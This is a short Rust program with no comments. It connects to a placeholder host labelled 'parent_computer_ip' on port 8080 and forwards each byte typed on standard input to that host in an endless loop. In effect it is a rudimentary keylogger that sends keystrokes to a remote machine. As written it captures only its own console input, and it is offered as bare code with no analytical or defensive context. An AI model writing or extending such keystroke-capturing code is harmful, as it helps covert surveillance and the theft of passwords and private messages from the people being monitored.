use std::io::{self, Read, Write};
use std::net::{TcpStream, TcpListener};
use std::{thread, time};

fn main() {
    let mut stream = TcpStream::connect("parent_computer_ip:8080").unwrap();

    loop {
        
        let mut keystroke = [0];
        io::stdin().read_exact(&mut keystroke).unwrap();

        stream.write_all(&keystroke).unwrap();
        thread::sleep(time::Duration::from_millis(100));
    }
}
